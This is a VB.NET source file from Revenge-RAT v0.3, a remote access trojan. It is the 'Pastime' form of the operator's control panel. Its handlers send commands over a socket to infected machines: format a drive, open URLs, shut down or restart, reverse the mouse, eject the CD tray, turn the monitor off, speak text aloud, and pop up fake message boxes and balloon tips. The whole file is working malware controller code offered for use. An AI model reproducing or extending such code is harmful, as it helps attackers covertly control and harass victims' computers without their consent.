Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RevengeRAT.My
Imports RevengeRAT.My.Resources
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Pastime
    Public Buttonn As String
    Public Iconn As String
    Public Sock As Integer

    Private Sub Close_Click(sender As Object, e As EventArgs) Handles Close.Click
        My.Forms.Main.s.Send(Me.Sock, "CloseCD")
    End Sub

    Private Sub Format_Click(sender As Object, e As EventArgs) Handles Format.Click
        If (MessageBox.Show("this option will not remove anything from the system files!" & ChrW(13) & ChrW(10) & "Also not work with Win XP probably, Are you sure?!", "For your information", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes) Then
            My.Forms.Main.s.Send(Me.Sock, "Format")
        End If
    End Sub

    Private Sub Normal_Click(sender As Object, e As EventArgs) Handles Normal.Click
        My.Forms.Main.s.Send(Me.Sock, "NormalMouse")
    End Sub

    Private Sub Open_Click(sender As Object, e As EventArgs) Handles Open.Click
        My.Forms.Main.s.Send(Me.Sock, "OpenCD")
    End Sub

    Private Sub Opens_Click(sender As Object, e As EventArgs) Handles Opens.Click
        If (Me.URL.Text.Length > 0) Then
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("OpS" & My.Forms.Main.Key), SocketServer.Encode(Me.URL.Text)), My.Forms.Main.Key), Me.Time.Value.ToString)}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub Pastime_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.Sock, "Abort")
    End Sub

    Private Sub Pastime_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ComboBox1.SelectedIndex = 1
    End Sub

    Private Sub Restart_Click(sender As Object, e As EventArgs) Handles Restart.Click
        My.Forms.Main.s.Send(Me.Sock, "RE")
    End Sub

    Private Sub SB_Click(sender As Object, e As EventArgs) Handles SB.Click
        If (Me.BT.Text = Nothing) Then
            MessageBox.Show("Add a title!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf (Me.BTX.Text = Nothing) Then
            MessageBox.Show("Add a text!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("SBT" & My.Forms.Main.Key), SocketServer.Encode(Me.BT.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.BTX.Text)), My.Forms.Main.Key), Me.ComboBox1.SelectedIndex), My.Forms.Main.Key), &H1388)}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub SD_Click(sender As Object, e As EventArgs) Handles SD.Click
        My.Forms.Main.s.Send(Me.Sock, "SD")
    End Sub

    Private Sub SendMsgbox_Click(sender As Object, e As EventArgs) Handles SendMsgbox.Click
        Me.ButtonAndIcon()

        If ((Me.Textc.Text.Length > 0) AndAlso (Me.Title.Text.Length > 0)) Then
            Dim flagArray As Boolean()
            If Me.Empty.Checked Then
                Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Msgbox" & My.Forms.Main.Key), SocketServer.Encode(Me.Textc.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.Buttonn)), My.Forms.Main.Key), SocketServer.Encode(Me.Title.Text)), My.Forms.Main.Key), "Nothing")}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Else
                Dim objArray As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Msgbox" & My.Forms.Main.Key), SocketServer.Encode(Me.Textc.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.Buttonn)), My.Forms.Main.Key), SocketServer.Encode(Me.Iconn)), My.Forms.Main.Key), SocketServer.Encode(Me.Title.Text)), My.Forms.Main.Key), "1")}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            End If
        End If
    End Sub

    Private Sub Speak_Click(sender As Object, e As EventArgs) Handles Speak.Click
        If (Me.Stext.Text.Length > 0) Then
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("Speak" & My.Forms.Main.Key), SocketServer.Encode(Me.Stext.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub Swap_Click(sender As Object, e As EventArgs) Handles Swap.Click
        My.Forms.Main.s.Send(Me.Sock, "ReverseMouse")
    End Sub

    Private Sub Test_Click(sender As Object, e As EventArgs) Handles Test.Click
        Me.ButtonAndIcon()

        If Me.Empty.Checked Then
            Me.FakeMsgBoxNoIcon(Me.Textc.Text, DirectCast(Conversions.ToInteger(Me.Buttonn), MsgBoxStyle), Me.Title.Text)
        Else
            Me.FakeMsgBox(Me.Textc.Text, DirectCast(Conversions.ToInteger(Me.Buttonn), MsgBoxStyle), DirectCast(Conversions.ToInteger(Me.Iconn), MsgBoxStyle), Me.Title.Text)
        End If
    End Sub

    Private Sub Turnoff_Click(sender As Object, e As EventArgs) Handles Turnoff.Click
        My.Forms.Main.s.Send(Me.Sock, "Turnoff")
    End Sub

    Private Sub Turnon_Click(sender As Object, e As EventArgs) Handles Turnon.Click
        My.Forms.Main.s.Send(Me.Sock, "TurnOn")
    End Sub

    Public Function ButtonAndIcon() As Object
        Dim obj2 As Object
        If Me.Information.Checked Then
            Me.Iconn = "64"
        End If
        If Me.Question.Checked Then
            Me.Iconn = "32"
        End If
        If Me.Warning.Checked Then
            Me.Iconn = "48"
        End If
        If Me.Errorr.Checked Then
            Me.Iconn = "16"
        End If
        If Me.OK.Checked Then
            Me.Buttonn = "0"
        End If
        If Me.OKCancel.Checked Then
            Me.Buttonn = "1"
        End If
        If Me.RetryCancel.Checked Then
            Me.Buttonn = "5"
        End If
        If Me.YesNo.Checked Then
            Me.Buttonn = "4"
        End If
        If Me.YesNoCancel.Checked Then
            Me.Buttonn = "3"
        End If
        If Me.AbortRetryIgnore.Checked Then
            Me.Buttonn = "2"
        End If
        Return obj2
    End Function
    Public Function FakeMsgBox(ByVal TextX As String, ByVal BU As MsgBoxStyle, ByVal IC As MsgBoxStyle, ByVal Title As String) As Object
        Dim obj2 As Object
        Interaction.MsgBox(TextX, (BU + IC), Title)
        Return obj2
    End Function

    Public Function FakeMsgBoxNoIcon(ByVal TextX As String, ByVal BU As MsgBoxStyle, ByVal Title As String) As Object
        Dim obj2 As Object
        Interaction.MsgBox(TextX, BU, Title)
        Return obj2
    End Function

End Class